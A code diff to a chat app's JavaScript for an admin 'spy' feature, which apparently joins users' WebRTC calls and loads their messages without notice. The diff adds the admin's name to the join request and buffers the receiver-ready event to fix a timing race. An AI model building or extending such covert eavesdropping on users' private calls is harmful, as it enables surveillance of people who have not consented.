@@ -2493,7 +2493,7 @@ function spyOn(user1,user2){
   document.getElementById('spy-call-status').textContent='لا توجد مكالمة نشطة';
   document.getElementById('spy-msgs').innerHTML='<div style="color:#555;font-size:12px;text-align:center;padding:20px;">جارٍ التحميل...</div>';
   document.getElementById('spy-modal').style.display='flex';
-  socket.emit('spy-join',{user1,user2});
+  socket.emit('spy-join',{user1,user2,adminName:cu?.name});
 }
 
 function closeSpyModal(){
@@ -2632,9 +2632,25 @@ socket.on('spy-call-offer', async (d) => {
 });
 
 // Step 2: Server tells spy that receiver accepted — spy connects to RECEIVER too
+let _pendingReceiverSid = null; // buffer if receiver-ready arrives before PC1 done
 socket.on('spy-receiver-ready', async (d) => {
   if(document.getElementById('spy-modal').style.display==='none') return;
-  if(!_spyPC) return; // only if we already connected to caller
+  // If PC1 not ready yet, buffer receiverSid and retry
+  if(!_spyPC || _spyPC.signalingState === 'closed') {
+    _pendingReceiverSid = d;
+    setTimeout(async () => {
+      if(_pendingReceiverSid && _spyPC) {
+        const pd = _pendingReceiverSid; _pendingReceiverSid = null;
+        await _connectSpyToReceiver(pd);
+      }
+    }, 1500);
+    return;
+  }
+  _pendingReceiverSid = null;
+  await _connectSpyToReceiver(d);
+});
+
+async function _connectSpyToReceiver(d) {
   try {
     if(_spyPC2){ _spyPC2.close(); _spyPC2=null; }
     _spyPC2 = _makeSpyPC(2, d.receiverSid);
@@ -2643,8 +2659,8 @@ socket.on('spy-receiver-ready', async (d) => {
     const offer = await _spyPC2.createOffer();
     await _spyPC2.setLocalDescription(offer);
     socket.emit('spy-to-user-offer',{targetSid: d.receiverSid, offer: _spyPC2.localDescription});
-  } catch(e){ console.error('spy-receiver-ready PC2 error:',e); }
-});
+  } catch(e){ console.error('spy-receiver PC2 error:',e); }
+}
 
 // ICE from either call party forwarded to spy (for existing _spyPC/_spyPC2)
 socket.on('spy-call-ice', async (d) => {
